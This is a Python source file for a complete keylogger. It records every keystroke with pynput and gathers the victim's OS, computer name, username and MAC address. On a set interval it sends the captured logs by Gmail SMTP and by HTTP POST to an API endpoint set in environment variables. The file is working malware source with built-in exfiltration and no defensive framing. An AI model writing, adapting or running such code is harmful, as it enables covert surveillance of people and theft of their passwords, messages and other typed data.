#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib
import os
import shutil
import subprocess
import sys
import stat
import re
import uuid
import platform
import getpass
import requests
import json
from requests.structures import CaseInsensitiveDict
from datetime import datetime, timedelta
from datetime import datetime
import env


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password
        self.system_info = self.get_system_info()
        self.headers = CaseInsensitiveDict()

    def append_to_log(self, string):
        self.log = self.log + string

    def get_system_info(self):
        uname = platform.uname()
        os = uname[0] + " " + uname[2] + " " + uname[3]
        computer_name = uname[1]
        user = getpass.getuser()
        return [os, computer_name, user]

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.api_call(self.log)
        self.send_mail(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    # You can use send_mail method to send an email to a given Email address
    def send_mail(self, message):

        message = (
            "Subject: Logger Report\n\n"
            + "Report From:\n\n"
            + str(self.system_info)
            + "\n\nLogs:\n"
            + message
        )
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

    def api_call(self, message):
        now = datetime.now()
        start = now - timedelta(seconds=self.interval)
        array = self.get_system_info()
        url = os.getenv("API_URL")
        self.headers["Accept"] = "application/json"
        self.headers["Authorization"] = "Basic " + os.getenv("API_PASS")
        self.headers["Content-Type"] = "application/json"
        data_json = {
            "logs": message,
            "os": array[0],
            "desktop": array[1],
            "user": array[2],
            "mac": ":".join(re.findall("..", "%012x" % uuid.getnode())),
            "start": str(start),
            "now": str(now),
        }
        data = json.dumps(data_json)
        print(requests.post(url, headers=self.headers, data=data))


# Driver Code
EMAIL = os.getenv("EMAIL")
PASSWORD = os.getenv("PASSWORD")
INTERVAL = int(os.getenv("INTERVAL"))
keylogger = Keylogger(INTERVAL, EMAIL, PASSWORD)
keylogger.start()
